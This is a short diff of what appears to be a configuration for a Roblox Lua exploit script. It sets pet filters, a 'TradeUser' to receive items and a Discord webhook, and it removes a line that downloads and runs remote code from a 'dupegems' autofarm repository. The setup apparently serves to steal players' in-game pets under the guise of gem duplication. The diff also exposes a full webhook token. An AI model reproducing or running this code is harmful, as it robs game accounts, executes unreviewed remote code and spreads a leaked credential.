@@ -2,5 +2,4 @@ PetRarity = ""
 PetLimited = true
 PetAll = false
 TradeUser = "tyfortnycfPH"
-WebhookURL = "{"type": 1, "id": "991850282394853537", "name": "Number 3", "avatar": null, "channel_id": "991805503120359454", "guild_id": "991791438931169330", "application_id": null, "token": "WWmFxUwZOvMVbQY7c_CS6vV_SE5_ziJRjcRN8yvCYGt2cXTyNuwNw_G64bYzEFJYiD5J"}"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
+WebhookURL = https://discord.com/api/webhooks/991850282394853537/WWmFxUwZOvMVbQY7c_CS6vV_SE5_ziJRjcRN8yvCYGt2cXTyNuwNw_G64bYzEFJYiD5J
